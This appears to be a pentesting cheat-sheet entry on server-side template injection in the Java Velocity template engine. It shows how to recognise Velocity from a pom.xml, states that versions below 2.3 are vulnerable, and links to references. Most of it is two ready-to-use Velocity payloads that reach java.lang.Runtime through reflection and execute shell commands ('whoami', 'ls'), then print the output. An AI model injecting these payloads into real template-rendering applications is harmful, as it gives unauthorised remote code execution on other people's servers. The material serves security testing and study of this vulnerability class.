## What is?
This is another template engine, but this time based in Java.


## How to Identify?
If you can get the source code, you might be able to identify from example the file **pom.xml**.
```xml
<dependencies>
<dependency>
<groupId>org.springframework.boot</groupId>
<artifactId>spring-boot-starter-web</artifactId>
</dependency>
<dependency>
<groupId>org.apache.velocity</groupId>
<artifactId>velocity</artifactId>
<version>1.7</version>
</dependency>
<dependency>
<groupId>org.apache.velocity</groupId>
<artifactId>velocity</artifactId>
<version>1.7</version>
</dependency>
</dependencies>
```


## Vulnerable versions?
All the versions *lower that 2.3* are vulnerable to this exploit.


## Reference
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java
- https://gosecure.github.io/template-injection-workshop/#6


## RCE
- This first version will verbose the response in DEC code that need to be manually parsed as ASCII from charcode.
```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("whoami"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i in [1..$out.available()])
$out.read()
#end
```

- This second instead it converts the code directly to ASCII in the SSTI payload.
```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##

#set($ex=$rt.getRuntime().exec('ls'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```
